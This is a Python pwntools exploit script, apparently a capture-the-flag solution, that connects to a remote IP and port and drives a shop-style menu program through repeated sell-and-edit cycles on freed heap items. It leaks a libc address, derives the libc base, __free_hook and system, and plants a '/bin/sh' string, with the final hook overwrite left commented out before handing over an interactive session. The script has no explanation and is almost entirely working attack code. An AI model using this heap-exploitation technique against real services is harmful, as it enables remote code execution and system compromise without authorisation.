from pwn import *

context.terminal = ['tmux']
# p = process('./vuln')
p = remote('193.57.159.27',26060)
#pid = gdb.attach(p,gdbscript='')
#raw_input()

def buy_item(p,idx):
	p.sendlineafter("> ",'b')
	p.sendlineafter(":\n",str(idx))

def sell_item(p,idx):
	p.sendlineafter("> ",'s')
	p.sendlineafter("index?\n",str(idx))

def edit_item(p, idx,price,name):
	p.sendlineafter("> ",'e')
	p.sendlineafter("index?\n",str(idx))
	p.sendlineafter("price:\n",str(price))
	p.sendlineafter("name:\n",str(name))

def view_item(p,idx):
	p.sendlineafter("> ",'v')
	p.sendlineafter("index?\n",str(idx))

def Buy_item(p,idx):	
	p.sendlineafter("> " ,'B')
	p.sendlineafter(":\n",str(idx))



def code_redirect(p):
	buy_item(p,10)
	buy_item(p,0x68732f6e69622f)


	Buy_item(p,5)
	for i in range(8):
		sell_item(p,0)
		edit_item(p,0,100,'AAAAAAAA')
		
	view_item(p,0)
	print(p.recvuntil('ID: '))
	libc_leak = int(p.recvline())

	print('libc_leak: ',hex(libc_leak))
	__free_hook = libc_leak + 0x2f48
	libc_base = __free_hook - 0x0000000001eeb28
	print("libc_hook: ", hex(__free_hook))
	print('libc_bse: ',hex(libc_base))
	system = libc_base + 0x000000000055410
	print('system: ',hex(system))

	# sell_item(p,2)
	# edit_item(p,2,100,'AAAAAAAA')
	# sell_item(p,2)
	# edit_item(p,2,100,'BBBBBBB')
	# sell_item(p,2)
	# Buy_item(p,__free_hook)	
	# Buy_item(p,4)
	# Buy_item(p,int(system))
	# sell_item(p,1)


#raw_input()
code_redirect(p)



p.interactive()


